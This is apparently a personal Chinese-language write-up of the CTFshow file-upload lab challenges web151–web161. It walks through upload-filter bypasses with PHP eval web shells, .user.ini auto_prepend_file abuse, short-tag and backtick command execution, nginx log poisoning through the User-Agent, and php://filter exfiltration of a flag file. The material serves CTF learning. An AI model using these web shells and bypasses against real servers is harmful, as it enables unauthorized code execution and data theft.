# CTFSHOW-文件上传

[TOC]

---

## 文件上传手段

...

## web151

> 前端过滤

前端过滤，抓包修改后缀，连接获取flag

![image-20250114214610593](https://gitee.com/bx33661/image/raw/master/path/image-20250114214610593.png)

查找得到

![image-20250114214730414](https://gitee.com/bx33661/image/raw/master/path/image-20250114214730414.png)

## web152

> 后端不能单一校验

跟上一题一样的方法

但是这一题主要是考查单一对MIME的检测(Content-Type)，全面的Type如下

1. `text/plain`
2. `text/html`
3. `text/css`
4. `text/javascript`
5. `image/jpeg`
6. `image/png`
7. `image/gif`
8. `image/svg+xml`
9. `audio/mpeg`
10. `audio/wav`
11. `audio/ogg`
12. `video/mp4`
13. `video/ogg`
14. `video/webm`
15. `application/json`
16. `application/xml`
17. `application/javascript`
18. `application/pdf`
19. `application/octet-stream`
20. `application/x-www-form-urlencoded`
21. `multipart/form-data`
22. `font/woff`
23. `font/woff2`
24. `font/ttf`
25. `application/zip`
26. `application/gzip`
27. `application/vnd.ms-excel`
28. `application/vnd.openxmlformats-officedocument.spreadsheetml.sheet`



## web153

> 后端不能单一校验

常规方法不行了

![image-20250114220648061](https://gitee.com/bx33661/image/raw/master/path/image-20250114220648061.png)

```php
auto_append_file = "2.png"
//auto_prepend_file 是 PHP 中的一个配置指令，用于指定一个 PHP 文件，该文件会在每个 PHP 脚本执行之前自动包含（即前置加载）。这个功能通常用于在多个脚本中共享一些公共代码，比如初始化设置、加载库文件、安全检查等
```

上传.user.ini

> .user.ini在nginx或者Apache都可以用
>
> 关于 `.user.ini` 文件
>
> `.user.ini` 是一种配置文件，通常用于 PHP 项目中，用于覆盖或补充服务器的主配置文件（如 `php.ini`）中的设置。它允许开发者为特定目录或项目自定义 PHP 配置，而无需修改全局的 `php.ini` 文件。
>
> **`.user.ini` 的作用**
>
> - **局部配置**：为特定目录或项目设置 PHP 配置。
> - **灵活性**：无需修改服务器的主配置文件（`php.ini`），避免影响其他项目。
> - **便捷性**：适合在共享主机环境中使用，开发者没有权限修改全局配置时。

![image-20250114223330347](https://gitee.com/bx33661/image/raw/master/path/image-20250114223330347.png)

访问index.php

蚁剑直接连，找到flag

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-24 19:34:52
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-24 21:46:57
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/
error_reporting(0);
if ($_FILES["file"]["error"] > 0)
{
	$ret = array("code"=>2,"msg"=>$_FILES["file"]["error"]);
}
else
{
    $filename = $_FILES["file"]["name"];
    $filesize = ($_FILES["file"]["size"] / 1024);
    if($filesize>1024){
    	$ret = array("code"=>1,"msg"=>"文件超过1024KB");
    }else{
    	if($_FILES['file']['type'] == 'image/png'){
            $arr = pathinfo($filename);
            $ext_suffix = $arr['extension'];
            if($ext_suffix!='php'){
                move_uploaded_file($_FILES["file"]["tmp_name"], "upload/".$_FILES["file"]["name"]);
                $ret = array("code"=>0,"msg"=>"upload/".$_FILES["file"]["name"]);
            }else{
                $ret = array("code"=>2,"msg"=>"文件类型不合规");
            }
    		
    	}else{
    		$ret = array("code"=>2,"msg"=>"文件类型不合规");
    	}
    	
    }

}

echo json_encode($ret);
```



## Web154

> 后端不能单二校验

上传png后回应文件不合规，我们可以尝试短链接

```php
<? @eval($_POST['attack']);?>

//<?phP @eval($_POST['attack']);?>
//<?= eval($_POST['attack']);?>
```

![image-20250115111042073](https://gitee.com/bx33661/image/raw/master/path/image-20250115111042073.png)

上传

```ini
auto_prepend_file=mum.png
short_open_tag = On
```

![image-20250115111222945](https://gitee.com/bx33661/image/raw/master/path/image-20250115111222945.png)

跟上一题一样，直接连接可以拿到flag

查看过滤,多了一个匹配PHP字符的步骤

```php
<?php
error_reporting(0);
if ($_FILES["file"]["error"] > 0)
{
	$ret = array("code"=>2,"msg"=>$_FILES["file"]["error"]);
}
else
{
    $filename = $_FILES["file"]["name"];
    $filesize = ($_FILES["file"]["size"] / 1024);
    if($filesize>1024){
    	$ret = array("code"=>1,"msg"=>"文件超过1024KB");
    }else{
    	if($_FILES['file']['type'] == 'image/png'){
            $arr = pathinfo($filename);
            $ext_suffix = $arr['extension'];
            if($ext_suffix!='php'){
                $content = file_get_contents($_FILES["file"]["tmp_name"]);
                if(strrpos($content, "php")==FALSE){
                    move_uploaded_file($_FILES["file"]["tmp_name"], "upload/".$_FILES["file"]["name"]);
                    $ret = array("code"=>0,"msg"=>"upload/".$_FILES["file"]["name"]);
                }else{
                    $ret = array("code"=>3,"msg"=>"文件内容不合规");
                }
                
            }else{
                $ret = array("code"=>2,"msg"=>"文件类型不合规");
            }
    		
    	}else{
    		$ret = array("code"=>2,"msg"=>"文件类型不合规");
    	}
    	
    }

}

echo json_encode($ret);
```



## web155

> 后端不能单三校验

过滤了大写绕过，我们可以继续采用上一题的短标签绕过



## web156

再次执行上面的方法发现不放行

**ban了[]符号**

可以替换成{}符号

![image-20250115114021535](https://gitee.com/bx33661/image/raw/master/path/image-20250115114021535.png)



## web157

以往的方法都走不通，ban了{},[],,,发现连；号都过滤了

当只有一句的话，后面的;可以不加

```(空)
<?= system("cat ../fla*")?>
```

上传.user.ini

访问index.php

![image-20250115115849635](https://gitee.com/bx33661/image/raw/master/path/image-20250115115849635.png)



## web158

> 单六检测

看了一下同样的方法可以使用



## web159

在前两题的基础上过滤了 `()`,我们没法使用命令执行函数

```php
<?= `cat ../fl*`?>
```



## web160

这个过滤更加严格，这个题的思路我学习了一下是这样的

利用日志包含

> nginx 默认日志地址为 `/var/log/nginx/access.log`

1. 上传mum.png,

```(空)
<?=include"/var/lo"."g/nginx/access.lo"."g"?>
```

2. 上传.user.ini

```ini
auto_prepend_file=shell.png
```

3. 修改UA

```PHP
<?php @eval($_GET["attack"]);?>
```

4. 连接



## web161

> 增加了对图片头的检测

可以采用上一题的思路

同时也可以,利用伪协议把flag.php带出来

```(空)
GIF89a
<?=include"ph"."p://filter/convert.base64-encode/resource=../flag.ph"."p"?>

GIF89a
auto_prepend_file=mum.png
```

![image-20250115152622990](https://gitee.com/bx33661/image/raw/master/path/image-20250115152622990.png)
